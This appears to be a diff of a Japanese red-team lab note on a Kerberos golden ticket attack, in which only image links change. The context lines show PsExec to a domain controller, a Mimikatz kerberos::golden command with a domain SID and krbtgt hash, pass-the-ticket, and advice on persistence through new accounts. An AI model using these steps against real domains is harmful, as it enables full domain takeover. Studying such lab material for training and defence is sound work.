@@ -17,7 +17,7 @@ grand_parent: Red Team
 ```powershell
 PsExec64.exe \\DC1 cmd.exe
 ```
-![](../../../../assets/images/Pasted%20image%2020260502094358.png)
+![[Pasted image 20260502094358.png]]
 
 ## 2. Mimikatz を使用してkrbtgtアカウントのパスワード ハッシュを抽出
 - jeffadmin（Domain Admins）アカウントを使用してRDPでDC1にログイン
@@ -64,7 +64,7 @@ kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1
 - /sid:S-1-5-21-1987370270-658905905-1781884369 
 - /krbtgt:1693c6cefafffc7af11ef34d1c788f47 
 - /ptt Pass the Ticket
-![](../../../../assets/images/Pasted%20image%2020260502094413.png)
+![[Pasted image 20260502094413.png]]
 
 ### mimikatz上から新しいプロンプトを起動
 ```mimikatz
@@ -85,8 +85,8 @@ whoami
 
 whoami /groups
 ```
-![](../../../../assets/images/Pasted%20image%2020260502094435.png)
-![](../../../../assets/images/Pasted%20image%2020260502094441.png)
+![[Pasted image 20260502094435.png]]
+![[Pasted image 20260502094441.png]]
 jenがDomain Adminsに所属していることが確認できる
 ### 6. 注意点
 #### ホスト名を使用すること
@@ -94,7 +94,7 @@ PsExec をホスト名ではなくドメインコントローラの IP アドレ
 ```cmd
 psexec.exe \\192.168.158.70 cmd.exe
 ```
-![](../../../../assets/images/Pasted%20image%2020260502094447.png)
+![[Pasted image 20260502094447.png]]
 
 #### 永続化にはしっかりとユーザの作成や、グループへの追加操作等を実施すること
 チケットによる一時的な権限のため、再起動すると消えてしまう
